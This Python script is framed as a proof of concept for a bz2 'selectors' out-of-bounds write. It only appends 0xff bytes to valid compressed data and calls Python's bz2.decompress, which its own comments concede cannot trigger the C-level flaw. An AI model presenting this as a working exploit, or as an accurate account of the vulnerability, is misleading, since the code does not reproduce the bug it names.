import bz2
import os

def create_malicious_bz2_data(num_selectors):
    """Creates a bz2 compressed file with a large number of selectors, triggering the potential vulnerability."""
    block_size = 100  # Keep it small for this example
    data = b'A' * block_size  # Simple data block
    compressed_data = bz2.compress(data)

    #Modify the compressed data to have a large number of selectors in the original bz2 data format (not the python bz2 wrapper)
    # The compressed data format is complicated, so instead of generating the exact raw bytes,
    # this example just adds additional 'selectors' at the end of the compressed data which is not what normally happens.
    # The goal is to mimic the effect by adding extra data that the vulnerable code would process incorrectly

    # This is *not* valid bz2 data
    modified_compressed_data = compressed_data
    for i in range (num_selectors):
        modified_compressed_data += b'\xff' #Adding some arbitary data
    return modified_compressed_data


def vulnerable_decompress(compressed_data):
    """Simulates the vulnerable decompression process with an out-of-bounds write. Note that the real vulnerability is in C not Python code, this is just for demonstration purposes."""
    try:
      decompressed_data = bz2.decompress(compressed_data)
      return decompressed_data
    except Exception as e:
      return f"Decompression failed with: {e}" #In real case would crash or do wrong behavior

if __name__ == "__main__":
    num_selectors = 10000  # High number of selectors
    malicious_data = create_malicious_bz2_data(num_selectors)
    decompressed = vulnerable_decompress(malicious_data)
    print(f"Decompressed data (or error): {decompressed[:100]}") # Limit output